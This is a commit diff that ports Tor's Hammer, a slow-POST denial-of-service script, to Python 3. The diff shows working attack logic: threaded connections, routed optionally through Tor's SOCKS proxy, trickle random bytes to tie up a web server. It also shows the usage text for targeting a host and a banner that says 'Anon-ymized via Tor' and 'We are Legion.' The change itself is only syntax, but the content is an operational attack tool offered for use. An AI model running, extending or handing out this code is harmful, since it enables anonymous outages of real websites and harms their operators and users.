1780d5bd3a439305f09e761f4f9b222bab64c010
karlheinzniebuhr <karl.booklover@gmail.com>
2020-07-10 10:27:05 -0400

    updated prints for python 3

--- torshammer.py
+++ torshammer.py
@@ -73,7 +73,7 @@ class httpPost(Thread):
                 self.running = False
                 break
             p = random.choice(string.letters+string.digits)
-            print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
+            print(term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL)
             self.socks.send(p)
             time.sleep(random.uniform(0.1, 3))
 
@@ -87,20 +87,20 @@ class httpPost(Thread):
                         self.socks.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
                         time.sleep(1)
                     self.socks.connect((self.host, self.port))
-                    print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
+                    print(term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL)
                     break
-                except Exception, e:
-                    print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
-                    print e
+                except Exception as e:
+                    print(term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL)
+                    print(e)
                     time.sleep(1)
                     sys.exit()
 
             while self.running:
                 try:
                     self._send_http_post()
-                except Exception, e:
+                except Exception as e:
                     if e.args[0] == 32 or e.args[0] == 104:
-                        print term.BOL + term.UP + term.CLEAR_EOL + "Thread broken, restarting..." + term.NORMAL
+                        print(term.BOL + term.UP + term.CLEAR_EOL + "Thread broken, restarting..." + term.NORMAL)
                         self.socks = socks.socksocket()
                         break
                     time.sleep(0.1)
@@ -108,13 +108,13 @@ class httpPost(Thread):
 
 
 def usage():
-    print "./torshammer.py -t <target> [-r <threads> -p <port> -T -h]"
-    print " -t|--target <Hostname|IP>"
-    print " -r|--threads <Number of threads> Defaults to 256"
-    print " -p|--port <Web Server Port> Defaults to 80"
-    print " -T|--tor Enable anonymising through tor on 127.0.0.1:9150"
-    print " -h|--help Shows this help\n"
-    print "Eg. ./torshammer.py -t 192.168.1.100 -r 256\n"
+    print("./torshammer.py -t <target> [-r <threads> -p <port> -T -h]")
+    print(" -t|--target <Hostname|IP>")
+    print(" -r|--threads <Number of threads> Defaults to 256")
+    print(" -p|--port <Web Server Port> Defaults to 80")
+    print(" -T|--tor Enable anonymising through tor on 127.0.0.1:9150")
+    print(" -h|--help Shows this help\n")
+    print("Eg. ./torshammer.py -t 192.168.1.100 -r 256\n")
 
 
 def main(argv):
@@ -148,11 +148,11 @@ def main(argv):
         usage()
         sys.exit(-1)
 
-    print term.DOWN + term.RED + "/*" + term.NORMAL
-    print term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL
-    print term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL
-    print term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORMAL
-    print term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL
+    print(term.DOWN + term.RED + "/*" + term.NORMAL)
+    print(term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL)
+    print(term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL)
+    print(term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORMAL)
+    print(term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL)
 
     rthreads = []
     for i in range(threads):
@@ -164,18 +164,18 @@ def main(argv):
         try:
             rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
         except KeyboardInterrupt:
-            print "\nShutting down threads...\n"
+            print("\nShutting down threads...\n")
             for t in rthreads:
                 stop_now = True
                 t.running = False
 
 if __name__ == "__main__":
-    print "\n/*"
-    print " *"+term.RED + " Tor's Hammer "+term.NORMAL
-    print " * Slow POST DoS Testing Tool"
-    print " * entropy [at] phiral.net"
-    print " * Anon-ymized via Tor"
-    print " * We are Legion."
-    print " */\n"
+    print("\n/*")
+    print(" *"+term.RED + " Tor's Hammer "+term.NORMAL)
+    print(" * Slow POST DoS Testing Tool")
+    print(" * entropy [at] phiral.net")
+    print(" * Anon-ymized via Tor")
+    print(" * We are Legion.")
+    print(" */\n")
 
     main(sys.argv[1:])
